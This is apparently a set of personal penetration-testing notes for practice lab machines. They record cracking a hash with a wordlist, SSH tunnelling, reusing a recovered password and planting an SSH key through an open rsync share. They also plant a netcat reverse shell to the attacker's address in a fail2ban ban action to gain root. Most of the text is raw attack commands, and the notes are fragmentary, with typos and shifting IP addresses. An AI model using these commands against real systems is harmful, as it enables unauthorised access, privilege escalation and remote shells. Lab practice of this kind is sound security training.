![[Pasted image 20260711071439.png]]

![[Pasted image 20260711071514.png]]

john hash --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar

![[Pasted image 20260711073036.png]]

ssh -L 9090:192.168.49.59:80 ariah@

```bash
ssh -N -L 0.0.0.0:80:192.168.49.59:80 ariah@192.168.59.99
```
NowiseSloopTheory139

```
http://nickel-backup/?whoami
```

nickel nickel-backup corp-nas

curl http://localhost/?whoami


localhost/?whoami
https://uoftctf.org/posts/proving-ground-nickel-walkthrough/


ssh -l araiah 192.168.55.99

NowiseSloopTheory139


 rsync -av --list-only rsync://192.168.66.126/fox
rsync -av rsync://192.168.66.126/fox ./rsyn_shared

rsync test 192.168.66.126::fox

rsync -av --list-only rsync://192.168.66.126/fox/.ssh

rsync authorized keys 192.168.66.126::fox/.ssh/

ssh fox@192.168.66.126

ssh -i ~/.ssh/id_ed25519 fox@192.168.66.126


rsync id_ed25519.pub 192.168.66.126::fox/.ssh/


ssh fox@192.168.66.126 -i id_ed25519.


nmap -sV --script "rsync-list-modules" 192.168.66.126 -p T:873 

rsync -av --list-only rsync://192.168.66.126/fox 

```bash
rsync -a --relative .ssh/ rsync:///fox 
```

```bash
rsync -av --list-only rsync://192.168.66.126/fox
```

```bash
ssh -i user.key fox@192.168.66.126
```

```
actionban = /usr/bin/nc -e /usr/bin/bash 192.168.49.66 5566
```

nc -lnvp 5566

ssh root@192.168.66.126

nano iptables-multiport.conf


```
cat /root/proof.txt
```